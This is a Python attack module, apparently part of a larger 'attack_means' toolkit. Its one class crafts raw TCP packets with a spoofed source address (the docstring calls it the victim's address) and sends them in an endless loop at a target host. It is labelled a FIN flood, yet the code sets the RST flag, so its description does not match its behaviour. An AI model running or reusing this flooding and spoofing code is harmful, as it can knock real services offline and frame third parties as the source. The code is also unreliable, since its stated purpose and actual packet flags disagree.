import socket
from multiprocessing import Queue
from attack_means import tools as tm
from impacket import ImpactPacket
import logging


class FinFloodAttack:

    @classmethod
    def send_tcp_packets_with_fin_set(cls,
                                      source_ip_address: str,
                                      source_port: int,
                                      destination_ip_address:str,
                                      destination_port:int,
                                      stop_signal_queue: Queue):
        """
        向目的节点进行 FIN 报文的发送
        :param source_ip_address: 被攻击者的 ip 地址
        :param source_port: 被攻击者的端口
        :param destination_ip_address: 目的节点的 ip 地址
        :param destination_port: 目的节点的端口
        :param stop_signal_queue: 是否停止的队列
        :return:
        """
        data = b"A" * 100
        current_seq_number = 1
        while True:
            try:
                raw_socket = tm.Tools.raw_socket_creator(socket.IPPROTO_TCP)
                # generate packet
                ip_packet = ImpactPacket.IP()
                ip_packet.set_ip_src(source_ip_address)
                ip_packet.set_ip_dst(destination_ip_address)
                tcp_packet = ImpactPacket.TCP()
                tcp_packet.set_th_sport(source_port)
                tcp_packet.set_th_dport(destination_port)
                tcp_packet.set_RST()
                # tcp_packet.set_ACK()
                # tcp_packet.set_th_ack(current_seq_number - 50)
                tcp_packet.set_th_seq(current_seq_number)
                tcp_packet.contains(ImpactPacket.Data(data))
                ip_packet.contains(tcp_packet)
                if not stop_signal_queue.empty():
                    break
                raw_socket.sendto(ip_packet.get_packet(), (destination_ip_address, destination_port))
                current_seq_number += 450
            except Exception as e:
                logging.exception(e)